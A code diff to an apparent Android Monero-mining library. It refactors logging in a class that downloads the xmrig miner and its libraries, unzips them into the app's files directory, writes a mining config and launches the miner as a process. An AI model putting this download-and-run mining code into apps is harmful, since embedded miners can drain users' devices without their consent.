@@ -13,14 +13,13 @@ import java.io.InputStreamReader;
 import java.io.ObjectStreamException;
 
 import waterhole.miner.core.utils.FileUtils;
+import waterhole.miner.core.utils.LogUtils;
 
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
 import static waterhole.miner.core.utils.FileUtils.downloadFile;
 import static waterhole.miner.core.utils.FileUtils.unzip;
 import static waterhole.miner.core.utils.IOUtils.closeSafely;
-import static waterhole.miner.core.utils.LogUtils.error;
 import static waterhole.miner.core.utils.LogUtils.info;
-import static waterhole.miner.monero.XmrMiner.LOG_TAG;
 
 final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {
 
@@ -58,10 +57,10 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
                         String[] split = TextUtils.split(line, " ");
                         mSpeed = split[split.length - 2];
                     }
-                    info(LOG_TAG, "accepted = " + mAccepted + " ,speed = " + mSpeed);
+                    LogUtils.info("accepted = " + mAccepted + " ,speed = " + mSpeed);
                 }
             } catch (IOException e) {
-                error(LOG_TAG, "exception", e);
+                LogUtils.error("exception", e);
             }
         }
 
@@ -139,14 +138,14 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
                 "         }\n" +
                 "         ]\n" +
                 "         }";
-        info(LOG_TAG, config);
+        LogUtils.info(config);
         FileOutputStream outStream = null;
         try {
             File file = new File(privatePath + "/config.json");
             outStream = new FileOutputStream(file);
             outStream.write(config.getBytes());
         } catch (Exception e) {
-            error(LOG_TAG, "exception:", e);
+            LogUtils.error("exception:", e);
         } finally {
             closeSafely(outStream);
         }
@@ -154,16 +153,16 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
 
     @Override
     public void onDownloadSuccess(String pathName) {
-        info(LOG_TAG, "download old miner success");
+        LogUtils.info("download old miner success");
 
         // 旧版门罗挖矿文件
         String fileDir = mContext.getFilesDir().getAbsolutePath();
         File xmrig = new File(fileDir + "/xmrig");
-        info(LOG_TAG, "xmrig exist: " + xmrig.exists());
+        LogUtils.info("xmrig exist: " + xmrig.exists());
         File uvFile = new File(fileDir + "/libuv.so");
-        info(LOG_TAG, "libuv.so exist: " + uvFile.exists());
+        LogUtils.info("libuv.so exist: " + uvFile.exists());
         File cplusFile = new File(fileDir + "/libc++_shared.so");
-        info(LOG_TAG, "libc++_shared.so exist: " + cplusFile.exists());
+        LogUtils.info("libc++_shared.so exist: " + cplusFile.exists());
 
         if (!xmrig.exists() || !uvFile.exists() || !cplusFile.exists()) {
             unzip(pathName, fileDir, this);
@@ -174,12 +173,12 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
 
     @Override
     public void onDownloadFail(String path, String reason) {
-        info(LOG_TAG, "download old miner fail: " + reason);
+        LogUtils.info("download old miner fail: " + reason);
     }
 
     @Override
     public void onUnzipComplete(String path) {
-        info(LOG_TAG, "unzip old miner success");
+        LogUtils.info("unzip old miner success");
 
         if (mProcess != null) {
             mProcess.destroy();
@@ -206,18 +205,18 @@ final class OldXmr implements FileUtils.DownloadCallback, FileUtils.UnzipCallbac
             mOutputHandler = new OutputReaderThread(mProcess.getInputStream());
             mOutputHandler.start();
         } catch (Exception e) {
-            error(LOG_TAG, "exception:", e);
+            LogUtils.error("exception:", e);
             mProcess = null;
         }
     }
 
     @Override
     public void onUnzipFail(String path, String reason) {
-        info(LOG_TAG, "unzip old miner fail: " + reason);
+        LogUtils.info("unzip old miner fail: " + reason);
     }
 
     @Override
     public void onUnzipEntryFail(String path, String reason) {
-        info(LOG_TAG, "unzip old miner entry fail: " + reason);
+        LogUtils.info("unzip old miner entry fail: " + reason);
     }
 }
